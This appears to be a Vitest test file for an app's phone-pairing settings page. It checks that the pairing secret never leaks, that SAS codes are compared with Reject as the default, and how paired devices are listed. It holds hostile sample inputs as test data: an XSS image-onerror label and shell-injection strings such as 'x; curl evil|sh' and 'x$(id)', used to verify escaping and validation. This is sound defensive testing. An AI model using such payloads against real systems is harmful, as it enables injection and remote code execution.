// Settings → Devices, "Pair a phone" (proposed pair/1, fixtures only): the gate, the blocked reasons, the link's
// secrecy and lifetime, the typed SAS with Reject as the default, untrusted labels and the paired devices from member.list (removal is CLI only).
import { act, cleanup, screen, waitFor, within } from '@testing-library/react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { api } from '@/api/client'
import { setFeatures } from '@/api/features'
import { checkSas, pairingApi, pairServed, realPairingApi } from '@/api/pairing'
import { MAC_DEVICE, pairPreviewForTests, resetLayoutPreview } from '@/dev/layoutPreview'
import { createPairFixture, fixtureLinks, installPairFixture } from '@/dev/pairFixture'
import { qrPath } from './host/Devices'
import { renderApp } from '@/test/renderApp'

const SECRET = 'demo-not-a-real-pair-secret'
const T = { timeout: 4000 }

let consoleCalls: unknown[][] = []
beforeEach(() => {
  consoleCalls = []
  for (const k of ['log', 'info', 'warn', 'error', 'debug', 'trace'] as const) vi.spyOn(console, k).mockImplementation((...a: unknown[]) => void consoleCalls.push(a))
})
afterEach(() => {
  cleanup()
  vi.restoreAllMocks()
  resetLayoutPreview()
  setFeatures(null)
})

const open = (scenario: string, opts?: Parameters<typeof pairPreviewForTests.set>[0]) => {
  pairPreviewForTests.set(opts ?? null)
  return renderApp(`/__layout/${scenario}`)
}

/** Everything the page could have leaked the link into. */
function expectNoLinkAnywhere(view: ReturnType<typeof renderApp>) {
  const caches = JSON.stringify([
    view.client.getQueryCache().getAll().map((q) => [q.queryKey, q.state.data]),
    view.client.getMutationCache().getAll().map((m) => m.state.data),
  ])
  expect(caches).not.toContain(SECRET)
  for (const store of [localStorage, sessionStorage]) for (let i = 0; i < store.length; i++) expect(String(store.getItem(store.key(i)!))).not.toContain(SECRET)
  expect(window.location.href).not.toContain(SECRET)
  expect(view.address()).not.toContain(SECRET)
  expect(JSON.stringify(window.history.state ?? null)).not.toContain(SECRET)
  expect(JSON.stringify(consoleCalls.map((c) => c.map(String)))).not.toContain(SECRET)
}

describe('the gate', () => {
  it('the real api answers "not available" and the gate needs both the feature and a served api', async () => {
    expect(realPairingApi.served('w')).toBe(false)
    await expect(realPairingApi.offer('w')).rejects.toMatchObject({ code: 'pair.unavailable' })
    setFeatures({ features: [] })
    expect(pairServed('w')).toBe(false)
    setFeatures({ features: ['pair'] })
    expect(pairServed('w')).toBe(false) // the real implementation: not until the ops are agreed
    const undo = installPairFixture(createPairFixture())
    expect(pairServed('w')).toBe(true)
    setFeatures({ features: [] })
    expect(pairServed('w')).toBe(false)
    undo()
    expect(pairingApi.served).toBe(realPairingApi.served)
  })

  it('pair-unavailable says so and calls nothing', async () => {
    open('pair-unavailable')
    expect(await screen.findByTestId('pair-unavailable', {}, T)).toHaveTextContent('Pairing a phone comes later. For now you approve on this computer, in the terminal.')
    expect(pairPreviewForTests.fixture()!.calls).toEqual([])
  })
})

describe('before offering', () => {
  const OFF = 'Update the orch app on the phone and scan again, or turn click-to-sign off first: orch host convenience off --workspace DEMO'

  it('convenience flag on: blocked with the exact turn-off line, no Create button', async () => {
    open('pair-blocked-convenience')
    const blocked = await screen.findByTestId('pair-blocked', {}, T)
    expect(blocked).toHaveAttribute('data-code', 'sign.convenience_readers')
    expect(screen.getByTestId('pair-convenience-off').textContent).toBe(OFF)
    expect(screen.queryByTestId('pair-convenience-custody')).toBeNull()
    expect(screen.queryByRole('button', { name: 'Create pairing link' })).toBeNull()
  })

  it('a key in convenience custody alone is not a block any more (the preview shows no custody hint)', async () => {
    open('pair-blocked-convenience', { preview: { blocked: { code: 'sign.convenience_readers', message: 'a phone app is too old', cause: 'custody' } } })
    await screen.findByTestId('pair-blocked', {}, T)
    expect(screen.queryByTestId('pair-convenience-custody')).toBeNull()
  })

  it('convenience history alone is not a block: a warning before Create pairing link', async () => {
    const warning = 'This workspace used click-to-sign; only phones with an up-to-date orch app can pair.'
    open('pair-offer', { preview: { warnings: [warning] } })
    expect(await screen.findByTestId('pair-warnings', {}, T)).toHaveTextContent(warning)
    expect(screen.queryByTestId('pair-blocked')).toBeNull()
    expect(screen.getByRole('button', { name: 'Create pairing link' })).toBeEnabled()
  })

  it.each([
    ['relay.not_linked', 'this workspace has no relay link'],
    ['relay.quota', 'the relay account is full'],
    ['host.limit', 'too many devices'],
    ['keys.primary_missing', 'run orch keys primary init first'],
  ])('blocked %s shows its code and the host message, and nothing to create', async (code, message) => {
    open('pair-offer', { preview: { blocked: { code, message } } })
    const blocked = await screen.findByTestId('pair-blocked', {}, T)
    expect(blocked).toHaveTextContent(code)
    expect(blocked).toHaveTextContent(message)
    expect(screen.queryByTestId('pair-blocked-convenience')).toBeNull()
    expect(screen.queryByRole('button', { name: 'Create pairing link' })).toBeNull()
  })

  it('warnings show before Create pairing link', async () => {
    open('pair-offer')
    const warnings = await screen.findByTestId('pair-warnings', {}, T)
    expect(warnings).toHaveTextContent('Click-to-sign stops working for this workspace once a phone is paired.')
    expect(screen.getByRole('button', { name: 'Create pairing link' })).toBeEnabled()
    expect(pairPreviewForTests.fixture()!.calls.some((c) => c.op === 'offer')).toBe(false)
  })
})

describe('the offer and its link', () => {
  async function created(opts?: Parameters<typeof pairPreviewForTests.set>[0], reveal = true) {
    const view = open('pair-offer', opts)
    await view.user.click(await screen.findByRole('button', { name: 'Create pairing link' }, T))
    await screen.findByTestId('pair-waiting', {}, T)
    if (reveal) await view.user.click(screen.getByRole('button', { name: 'Show QR and link' }))
    return view
  }

  it('review M1: nothing that carries the secret (QR, typed fallback, Copy link) shows before the one explicit reveal', async () => {
    const view = await created(undefined, false)
    expect(screen.queryByTestId('pair-qr')).toBeNull()
    expect(screen.queryByTestId('pair-fallback')).toBeNull()
    expect(screen.queryByRole('button', { name: 'Copy link' })).toBeNull()
    expect(document.body.innerHTML).not.toContain(SECRET)
    await view.user.click(screen.getByRole('button', { name: 'Show QR and link' }))
    expect(screen.getByTestId('pair-qr')).toBeInTheDocument()
    expect(screen.getByTestId('pair-fallback')).toHaveTextContent(SECRET)
    expect(screen.getByRole('button', { name: 'Copy link' })).toBeInTheDocument()
  })

  it('review L2: the QR carries the native orch:// link, not the https form', async () => {
    await created()
    const d = screen.getByTestId('pair-qr').querySelector('path')!.getAttribute('d')
    expect(d).toBe(qrPath(fixtureLinks(1).native_link).d)
    expect(d).not.toBe(qrPath(fixtureLinks(1).link).d)
  })

  it('review L1: Copy link, then a drop (cancel), clears the clipboard', async () => {
    const view = await created()
    await view.user.click(screen.getByRole('button', { name: 'Copy link' }))
    expect(await navigator.clipboard.readText()).toContain(SECRET)
    expect(screen.getByText(/clears your clipboard/)).toBeInTheDocument()
    const write = vi.spyOn(navigator.clipboard, 'writeText')
    await view.user.click(screen.getByRole('button', { name: 'Cancel pairing' }))
    await screen.findByTestId('pair-end-cancelled', {}, T)
    await waitFor(() => expect(write).toHaveBeenLastCalledWith(''))
  })

  it('review L3: a late timer does not keep the link: the clock is checked when the tab shows again', async () => {
    const view = await created() // the host's 5 minutes: the timer would fire much later
    expect(document.body.innerHTML).toContain(SECRET)
    const later = Date.now() + 6 * 60_000
    vi.spyOn(Date, 'now').mockReturnValue(later)
    act(() => void document.dispatchEvent(new Event('visibilitychange')))
    expect(await screen.findByTestId('pair-end-expired', {}, T)).toBeInTheDocument()
    expect(document.body.innerHTML).not.toContain(SECRET)
    expectNoLinkAnywhere(view)
  })

  it('review I1: an offer-time convenience refusal shows the dedicated screen, not the generic error line', async () => {
    const view = open('pair-offer', { offerError: { code: 'sign.convenience_readers', message: 'click-to-sign was switched on' } })
    await view.user.click(await screen.findByRole('button', { name: 'Create pairing link' }, T))
    expect(await screen.findByTestId('pair-blocked-convenience', {}, T)).toBeInTheDocument()
    expect(screen.queryByText(/Not done\./)).toBeNull()
  })

  it('the fallback is selectable text, never a link; Copy link copies the native link', async () => {
    const view = await created()
    expect(screen.getByTestId('pair-qr').tagName.toLowerCase()).toBe('svg')
    const fallback = screen.getByTestId('pair-fallback')
    expect(fallback.textContent).toMatch(/^https:\/\/relay\.example\.test\/pair#v2\./)
    expect(fallback.closest('a')).toBeNull()
    expect(document.querySelectorAll('a[href*="pair"]').length).toBe(0)
    expect(document.querySelectorAll('[href*="' + SECRET + '"]').length).toBe(0)
    await view.user.click(screen.getByRole('button', { name: 'Copy link' }))
    expect(await navigator.clipboard.readText()).toMatch(/^orch:\/\/pair\?relay=.*#v2\./)
    expect(screen.getByTestId('pair-countdown').textContent).toMatch(/^[45]:\d\d$/)
    expectNoLinkAnywhere(view)
  })

  it('the link is dropped at the first pending, and the person types the phone code', async () => {
    const view = await created()
    expect(document.body.innerHTML).toContain(SECRET)
    const fixture = pairPreviewForTests.fixture()!
    act(() => fixture.emit(fixture.offers()[0].offer_id, 'pending', { sas: 'K7Q2MA', label: 'Phone' }))
    await screen.findByTestId('pair-compare', {}, T)
    expect(document.body.innerHTML).not.toContain(SECRET)
    expect(document.body.textContent).not.toContain('K7Q2MA') // the host's SAS is compared, never shown
    expectNoLinkAnywhere(view)
  })

  it('the link is dropped at expiry (the host expires_ms, not a fixed time)', async () => {
    const view = await created({ ttlMs: 400 })
    expect(document.body.innerHTML).toContain(SECRET)
    expect(await screen.findByTestId('pair-end-expired', {}, T)).toHaveTextContent('The pairing link expired.')
    expect(document.body.innerHTML).not.toContain(SECRET)
    expectNoLinkAnywhere(view)
  })

  it('cancel drops the link and cancels the offer', async () => {
    const view = await created()
    await view.user.click(screen.getByRole('button', { name: 'Cancel pairing' }))
    expect(await screen.findByTestId('pair-end-cancelled', {}, T)).toBeInTheDocument()
    expect(document.body.innerHTML).not.toContain(SECRET)
    expect(pairPreviewForTests.fixture()!.calls.filter((c) => c.op === 'cancel')).toHaveLength(1)
    expectNoLinkAnywhere(view)
  })

  it('unmount drops the link', async () => {
    const view = await created()
    expectNoLinkAnywhere(view)
    view.unmount()
    expect(document.body.innerHTML).not.toContain(SECRET)
    expect(pairPreviewForTests.fixture()!.calls.filter((c) => c.op === 'offer')).toHaveLength(1)
  })

  it('an open offer whose link this page does not hold: cancel and make a new one', async () => {
    open('pair-offer', { offers: [{ offer_id: 'of_x', state: 'open', created_ms: 0, expires_ms: Date.now() + 60_000, scopes: ['look'] }] })
    expect(await screen.findByTestId('pair-lost-link', {}, T)).toHaveTextContent("can't show it again")
    expect(pairPreviewForTests.fixture()!.calls.some((c) => c.op === 'offer')).toBe(false)
  })
})

describe('compare the code', () => {
  it('Reject is the default and focused; Approve only after the typed code matches', async () => {
    const { user } = open('pair-pending')
    await screen.findByTestId('pair-compare', {}, T)
    const reject = screen.getByRole('button', { name: 'Reject' })
    const approve = screen.getByRole('button', { name: 'Approve' })
    await waitFor(() => expect(reject).toHaveFocus())
    expect(approve).toBeDisabled()
    const input = screen.getByLabelText('Type the six characters your phone shows')
    await user.type(input, 'K7Q2MB')
    expect(screen.getByTestId('pair-sas-differ')).toHaveTextContent('The codes differ: reject this phone.')
    expect(approve).toBeDisabled()
    await user.type(input, '{Enter}')
    expect(pairPreviewForTests.fixture()!.calls.some((c) => c.op === 'answer')).toBe(false)
    await user.clear(input)
    await user.type(input, 'k7q-2ma')
    expect(approve).toBeEnabled()
    await user.click(approve)
    await waitFor(() => expect(pairPreviewForTests.fixture()!.calls.find((c) => c.op === 'answer')?.args).toEqual(['7'.repeat(32), true]))
  })

  it('three typed mismatches refuse the offer; the remaining attempts are shown', async () => {
    const { user } = open('pair-pending')
    const input = await screen.findByLabelText('Type the six characters your phone shows', {}, T)
    await user.type(input, 'AAAAAA')
    expect(screen.getByTestId('pair-sas-attempts')).toHaveTextContent('2 attempts left')
    await user.type(input, '{Backspace}A') // the same code again is not a new attempt
    expect(screen.getByTestId('pair-sas-attempts')).toHaveTextContent('2 attempts left')
    await user.clear(input)
    await user.type(input, 'BBBBBB')
    expect(screen.getByTestId('pair-sas-attempts')).toHaveTextContent('1 attempt left')
    expect(pairPreviewForTests.fixture()!.calls.some((c) => c.op === 'answer')).toBe(false)
    await user.clear(input)
    await user.type(input, 'CCCCCC')
    expect(await screen.findByTestId('pair-end-rejected', {}, T)).toHaveTextContent('The codes differed 3 times')
    expect(pairPreviewForTests.fixture()!.calls.find((c) => c.op === 'answer')?.args).toEqual(['7'.repeat(32), false, { mismatches: 3 }])
  })

  it('Reject answers no', async () => {
    const { user } = open('pair-pending')
    await user.click(await screen.findByRole('button', { name: 'Reject' }, T))
    await waitFor(() => expect(pairPreviewForTests.fixture()!.calls.find((c) => c.op === 'answer')?.args).toEqual(['7'.repeat(32), false]))
    expect(await screen.findByTestId('pair-end-rejected', {}, T)).toHaveTextContent('Rejected on this computer.')
  })

  it('checkSas: base32, case-insensitive, spaces and dashes ignored', () => {
    expect(checkSas('', 'K7Q2MA')).toBe('empty')
    expect(checkSas('k7q', 'K7Q2MA')).toBe('partial')
    expect(checkSas('k7 q2-ma', 'K7Q2MA')).toBe('match')
    expect(checkSas('K7Q2MB', 'K7Q2MA')).toBe('differ')
    expect(checkSas('K7Q2MA', null)).toBe('differ')
  })

  it('the device label is rendered as text, isolated, never as markup', async () => {
    const label = '<img src=x onerror=alert(1)>‮evil'
    open('pair-pending', { offers: [{ offer_id: 'of_l', state: 'pending', created_ms: 0, expires_ms: Date.now() + 60_000, scopes: ['look'], sas: 'AAAAAA', label }] })
    const shown = within(await screen.findByTestId('pair-compare', {}, T)).getByTestId('pair-label')
    expect(shown.querySelector('img')).toBeNull()
    expect(shown.querySelector('bdi')).not.toBeNull()
    expect(shown).toHaveTextContent('<img src=x onerror=alert(1)>')
    expect(shown).toHaveTextContent('named by the device')
  })
})

describe('after the code', () => {
  it('cert_pending shows the two terminal steps with copyable commands and the cert code', async () => {
    open('pair-cert')
    expect(await screen.findByTestId('pair-cert-code', {}, T)).toHaveTextContent('H4WZ7P')
    expect(screen.getByTestId('pair-primary-command').textContent).toBe('orch host relay pair --resume --offer ' + '7'.repeat(32))
    expect(screen.getByTestId('pair-sign-command').textContent).toBe('orch sign <CODE>')
    expect(screen.getByTestId('pair-cert')).toHaveTextContent('refuses click-to-sign')
    for (const id of ['pair-primary-command', 'pair-sign-command']) expect(screen.getByTestId(id).closest('a')).toBeNull()
    expect(screen.queryByRole('button', { name: 'Get the signing code' })).toBeNull()
  })

  it('with the certificate in, Get the signing code opens the hand-off for relay.pair_device', async () => {
    const { user } = open('pair-cert', { offers: [{ offer_id: 'of_c', state: 'cert_pending', created_ms: 0, expires_ms: Date.now() + 60_000, scopes: ['look'], cert_ready: true }] })
    const add = await screen.findByRole('button', { name: 'Get the signing code' }, T)
    const spy = vi.spyOn(api, 'prepareHandoff')
    await user.click(add)
    await screen.findByRole('dialog', {}, T)
    expect(spy.mock.calls[0][1]).toEqual({ action: 'pair_device', offer: 'of_c' })
    spy.mockRestore()
  })

  it('failed shows the reason and the remove-the-device text', async () => {
    open('pair-failed')
    const end = await screen.findByTestId('pair-end-failed', {}, T)
    expect(end).toHaveTextContent('the certificate did not verify')
    expect(screen.getByTestId('pair-needs-remove')).toHaveTextContent('remove the device')
  })
})

describe('commands for the shell (review N1)', () => {
  it('only plain words from the host go into a command; anything else gives no command', async () => {
    const { shellWord, primaryCommand, convenienceOffCommand } = await import('@/api/pairing')
    for (const bad of ['x; curl evil|sh', 'x$(id)', 'a\u202Eb', 'a\u200Bb', '', '-rf', 'a b', 'a\nb']) {
      expect(shellWord(bad)).toBe(false)
      expect(convenienceOffCommand(bad)).toBeNull()
    }
    expect(primaryCommand('7'.repeat(32))).toBe('orch host relay pair --resume --offer ' + '7'.repeat(32))
    for (const bad of ['of_c', '7'.repeat(31), 'A'.repeat(32), '7'.repeat(31) + ';', null, undefined]) expect(primaryCommand(bad)).toBeNull()
  })

  it('an offer id the command can not carry gives a warning instead of a command', async () => {
    open('pair-cert', { offers: [{ offer_id: 'of_c', state: 'cert_pending', created_ms: 0, expires_ms: Date.now() + 60_000, scopes: ['look'] }] })
    expect(await screen.findByTestId('pair-command-unsafe', {}, T)).toHaveTextContent('start again')
    expect(screen.queryByTestId('pair-primary-command')).toBeNull()
  })
})

describe('paired devices', () => {
  it('come from member.list devices paired through the relay (read_ext/3); the Mac (relay: false) is not listed', async () => {
    open('pair-devices')
    const rows = await screen.findAllByTestId('device-row', {}, T)
    expect(rows.length).toBe(10)
    expect(screen.getByRole('table', { name: 'Paired devices' }).textContent).not.toContain(MAC_DEVICE.id)
    expect(rows[1]).toHaveTextContent('Severin')
    expect(rows[1].querySelectorAll('td')[3]).toHaveTextContent('yes')
    expect(rows[1].querySelectorAll('td')[5]).toHaveTextContent('none') // reader null: no verified record
    expect(rows[0].querySelectorAll('td')[5]).toHaveTextContent('1')
    expect(pairPreviewForTests.fixture()!.calls.map((c) => c.op)).toContain('members')
  })

  it('removal is one click after a review (#1198 C15): the hand-off is prepared for exactly that device, no command is shown', async () => {
    const { user } = open('pair-devices')
    const rows = await screen.findAllByTestId('device-row', {}, T)
    const spy = vi.spyOn(api, 'prepareHandoff')
    expect(within(rows[1]).queryByTestId('device-remove-command')).toBeNull()
    await user.click(within(rows[1]).getByRole('button', { name: 'Remove' }))
    await screen.findByRole('dialog', {}, T)
    expect(spy.mock.calls[0][1]).toEqual({ action: 'device_remove', device: 'd_' + '2'.repeat(32) })
    expect(await screen.findByTestId('device-remove-summary', {}, T)).toHaveTextContent('Severin') // whose device it is
    spy.mockRestore()
  })

  it('a label with an LF shows a line break inside the isolated text, never markup; an empty label shows "phone"', async () => {
    open('pair-offer')
    const rows = await screen.findAllByTestId('device-row', {}, T)
    const multi = within(rows[1]).getByTestId('pair-label')
    const bdi = multi.querySelector('bdi')!
    expect(bdi.textContent).toBe('Work phone\nsecond line')
    expect(bdi.className).toContain('whitespace-pre-wrap')
    expect(multi.querySelector('br')).toBeNull()
    expect(within(rows[2]).getByTestId('pair-label').textContent).toBe('phone')
  })
})
